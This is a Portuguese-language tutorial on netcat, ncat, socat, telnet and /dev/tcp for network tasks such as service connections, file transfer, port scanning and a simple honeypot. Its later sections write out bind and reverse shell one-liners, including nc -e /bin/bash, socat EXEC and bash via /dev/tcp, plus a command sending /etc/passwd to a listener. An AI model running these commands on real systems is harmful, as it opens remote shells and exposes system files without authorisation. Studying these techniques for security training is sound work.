Usar ferramentas que conseguem fazer várias utilidades dentro delas, como banner grabbing, conectar a servidores, fazer requisições, etc. A mais aprofundada dentro deste material será o [**Netcat](https://www.kali.org/tools/netcat/),**o swiss army knife das conexões TCP/IP

---

# Port Forwading

---

O port forwading se baseia em encaminhar portas da rede interna para a internet. Isso pode ser utilizado de múltiplas formas dentro do mundo hacking, uma delas por exemplo, seria agir como uma conexão reversa, onde você faz um servidor/serviço se conectar com a sua máquina e por esta conexão envia seus ataques/payloads/etc.

_Exemplo de Port Forwading_

![https://miro.medium.com/v2/resize:fit:1200/1*WG8vdzdoWvewIHjmD1yi_A.png](https://miro.medium.com/v2/resize:fit:1200/1*WG8vdzdoWvewIHjmD1yi_A.png)

O port forwading pode ser realizado diretamente na interface do seu provedor de acesso (roteadores)

# Netcat

---

Netcat é uma ferramenta de rede que permite ler e gravar dados em conexões de rede. Já vem instalada na maioria das distribuições Linux e pode ser utilizada no Windows por meio de um _nc.exe_

## Interagindo com serviços

Aprender a estabelecer conexões e interagir com serviços

```bash
#realizar a conexão com o servidor FTP do url
nc www.bussinesscorp.com.br 21
```

Após a conexão com o servidor você pode utilizar todos os comandos permittidos e possíveis do serviço, como seguindo este exemplo(ftp): USER xxx, PASS xxxxx, HELP, etc.

## Chat e IP logger

---

Podemos utilizar o netcat para abrir uma porta na nossa máquina

```bash
#Abrindo uma porta com o netcat
nc -vlp 3535
# -v : Modo Verboso // -l : Modo Listening // -p : Porta que vai abrir ocmd serviço
```

Após isso pode ser visto executando o comando _netstat -nlpt_ que nossa maquina esta com uma porta aberta

![image.png](attachment:f8524369-f4d5-4045-9c8f-d2f284d3179b:image.png)

Após a abertura da porta é possível realizar a conexão a esta porta por meio de um outro netcat, como por exemplo, estando em um windows e rodando o seguinte comando:

```bash
nc.exe (ip da máquina com o NetCat) (porta que foi aberta)
```

Depois de realizada a conexão você conseguirá utilizar a linha de comando como um “chat” entre as duas máquinas, pois a porta que foi aberta não tem nenhum serviço rodando emcima dela, mas tem a comunicação estabelecida.

Uma outra utilização do netcat é a capacidade de pegar as informações do usuário que acessou ao “serviço” aberto pelo netcat

Inicializando o netcat:

```bash
nc -lnvp 8080
```

Após isso se algum usuário se conectar ao seu ip dentro dessa porta via navegador você pode obter diversas infromações sobre ele

![image.png](attachment:7a28ea99-dc7d-43d1-a266-3fac851c7914:image.png)

Com isso você consegue criar uma espécie de _Ip Logger_ que obtém informações sobre o usuário conectado.

## UDP e File Transfer
---

O netcat também nos permite realizar conexões UDP e transferência de arquivos

```bash
nc -lvnup 4545

#-u : Realizar a conexão via UDP
```

Após abrir a porta com o netcat no modo UDP podemos utilizar o comando _netstat -nlpu_ para ver as portas e serviços abertos via UDP

![image.png](attachment:b7b16b6a-d47a-454e-afd1-c8bdca6dedef:image.png)

E para realizar a conexão como foi realizada anteriormente, porém agora em UDP basta utilizar o seguinte:

```bash
nc.exe -vnu (ip da máquina com o netcat) (porta que foi aberta)
```

Após isso a conexão foi estabelecida e você tem o mesmo terminal que anteriormente feito, porém agora utilizando o protocolo UDP para a comunicação.

A transferência de arquivos pode ser feita via netcat da seguinte maneira:

```bash
nc -lvnp 5050 > arquivo.txt

# > : redirecionar o que vier da conexão para este arquivo
```

```bash
nc -v (ip do "host") 5050 < arquivo.txt

# < : enviar o arquivo via esta conexão 
```

## Port Scanning
---

O netcat também contém em uma de suas muitas utilidades a opção de fazer o scanning de portas

```bash
nc -vnz (ip para o scan) (porta para o scan)

#-z : opção para realizar o scanning
```

ou, para várias portas:

```bash
nc -vnz (ip para o scan) (range de portas: 0-265)
```

## Criando um Honeypot
---

Honeypot é uma técnica de segurança onde você faz um serviço “vulnerável” e utiliza ele como armadilha para capturar dados sensíveis do hacker que está tentando fazer o ataque

Para criar o honeypot, precisamos inicializar o serviço armadilha e colocar todos os arquivos dentro de um log

```bash
nc -vlnp 21 < bait.txt 1>> comunicação.log 2>> comunicacao.log; echo $(date) >> 21.log

# bait.txt : arquivo com algum banner de algum serviço, algo que pode ser usado
# para atrair o hacker

# >> comunicação.log : enviar toda a "conversa" realizada dentro do serviço para
# este arquivo
# 1>> e 2>> : redirecionar sucessos e erros para a file determinada
# echo $(date) : salvar o dia e horário do acesso ao serviço
```

## Bind shell X Reverse shell
---

### Bind shell

![image.png](attachment:d66ce77c-732c-42f7-92d5-784ec3279ff6:image.png)

Exemplo Bind shell utilizando o netcat:

```bash
#(linux)
nc -lvnp 5050 -e /bin/bash
#(windows)
nc.exe -lvnp 5050 -e cmd.exe

	# -e : executar um comando assim que fazer a conexão
```

Assim que realziar a conexão você recebe o executado pelo comando, nesse caso, um shell/cmd

### Reverse shell

![image.png](attachment:72b2ba5a-38c1-4d0b-b176-1544993fb05f:image.png)

Exemplo de Reverse shell usando netcat:

```bash
 #deixar na sua própia máquina escutando para enviar o shell para ela
 nc -lvnp 5050

#dentro da máquina alvo
#(windows)
nc.exe -vn (ip da maquina que esta escutando) 5050 -e cmd.exe

#(linux)
nc (ip da maquina que esta escutando) 5050 -e /bin/bash
```

# Ncat X Netcat

---

O ncat é uma espécie de “evolução” do netcat, com algumas funções adicionais, como criptografia por exemplo, devido a suas constantes atualizações.

Para mais informações gerais, uso. Consultar: [https://nmap.org/ncat/](https://nmap.org/ncat/)

# Socat

---

O socat é uma outra ferramenta Swiss Army Knife, assim como o netcat e o ncat

Usage:

```bash

# - : utilizado pois o socat precisa de dois ip's porém com o - ele necessita de 
# 1 apenas

socat - tcp4-listen:2222
#ouvir na porta 2222 com o protocolo tcp

socat - udp4-listen:2222
#ouvir na porta 2222 com o protocolo udp

socat - tcp4:(ip da maquina escutando):(porta em que esta escutando) EXEC:/bin/bash
#EXEC : similiar ao -e do netcat, usado para enviar comandos e ações

```

# Telnet

---

O serviço Telent, também pode ser utilizado como um Swiss Army Knife para conexões de rede, podendo ser utilizado para interagir com serviços, assim como os anteriores.

Usage:

```bash
telnet (ip da maquina escutando) (porta sendo usada) | /bin/bash | telnet (ip da maquina) (outra porta)
# foi utilizado duas portas, uma para a conexão em si e outra para a parte "gráfica"
# o resultado dos comandos digitados
```

# /DEV/TCP
---

Método presente nas máquinas Linux para enviar uma comunicação tcp por forma de um socket TCP

Usage:

```bash
#Máquina escutando
nc -lvnp 2020

#Máquina que vai enviar os dados via tcp
echo "Olá" > /dev/tcp/(ip da máquina escutando)/(porta que foi configurada)
cat /etc/passwd > /dev/tcp/(ip)/(porta)

#shell reversa
bash -i > /dev/tcp/(ip)/(porta) 0>&1 2>&1

# 0>&1 e 0>&2 usados para enviar todas as saidas e erros dos comandos
# para a conexão
```